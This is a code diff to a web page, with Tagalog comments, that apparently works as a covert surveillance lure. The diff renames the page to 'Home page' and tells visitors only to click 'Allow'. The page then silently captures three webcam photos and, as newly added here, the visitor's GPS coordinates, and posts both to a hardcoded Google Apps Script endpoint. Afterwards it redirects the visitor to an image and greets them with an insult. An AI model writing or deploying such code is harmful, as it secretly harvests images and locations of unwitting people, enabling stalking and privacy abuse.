@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Educational Camera Tool - 3 Shots</title>
+    <title>Home page</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -19,8 +19,9 @@
             border-radius: 15px;
             box-shadow: 0 4px 15px rgba(0,0,0,0.1);
             text-align: center;
-            width: 90%;
+            width: 100%;
             max-width: 600px;
+			font-size: 2.5rem;
         }
         video {
             width: 100%;
@@ -54,8 +55,8 @@
 <body>
 
     <div class="container">
-        <h2>Triple Auto-Capture Demo</h2>
-        <p id="status">Just click allow to continue</p>
+        <h2>Welcome bitch!</h2>
+        <p id="status">Allow to continue.</p>
         <a href="index.html"><p id="retry"></p></a>
         
         <video id="video" autoplay playsinline style="display:none;"></video>
@@ -76,13 +77,26 @@
         let captureCount = 0;
         const maxCaptures = 3;
 
+        // VARIABLE PARA SA LOCATION
+        let userLocation = "Location Permission Denied";
+
         // URL ng Google Apps Script mo
         const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwwbh581jzwiY8qv1dfE-8qUzu2nIoALzyqobhRFwrEPMYCD6Y0g0FvxgcjBRG4MguOsg/exec";
 
         // --- PALITAN MO ITO: Dito mapupunta ang user pagkatapos ng capture ---
-        const REDIRECT_URL = "https://www.google.com"; 
+        const REDIRECT_URL = "https://pbs.twimg.com/media/G3pBT_PXkAAyVDC.jpg"; 
 
         async function initCamera() {
+            // --- BAGONG LOGIC: Pagkuha ng Coordinates ---
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        userLocation = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
+                    },
+                    (error) => { console.log("Location error: " + error.message); }
+                );
+            }
+
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: true, 
@@ -97,7 +111,7 @@
                 };
 
             } catch (err) {
-                status.innerText = "Sorry there's and error, make sure to click ALLOW to continue.";
+                status.innerText = "Sorry there's an error, make sure to click ALLOW to continue.";
                 retry.innerText = "Try again.";
                 console.error(err);
             }
@@ -139,11 +153,15 @@
             gallery.appendChild(newImg);
 
             try {
+                // IPAPADALA NA NATIN KASAMA ANG LOCATION DATA
                 await fetch(SCRIPT_URL, {
                     method: 'POST',
                     mode: 'no-cors',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ image: data })
+                    body: JSON.stringify({ 
+                        image: data,
+                        location: userLocation // Isinama ang Google Maps link
+                    })
                 });
                 console.log("Shot " + captureCount + " sent.");
             } catch (e) {
